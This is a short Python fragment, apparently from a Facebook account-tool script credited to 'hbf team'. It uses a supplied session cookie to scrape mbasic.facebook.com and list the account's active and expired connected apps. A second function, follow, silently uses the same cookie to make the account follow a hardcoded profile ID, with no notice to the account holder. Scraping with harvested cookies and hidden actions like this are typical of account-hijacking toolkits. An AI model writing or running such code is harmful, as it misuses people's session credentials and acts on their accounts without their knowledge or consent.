def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
    else:
        print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            #created by hbf team(owner) Hamii
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
        print(54*'-')
    else:
        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')

 

def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
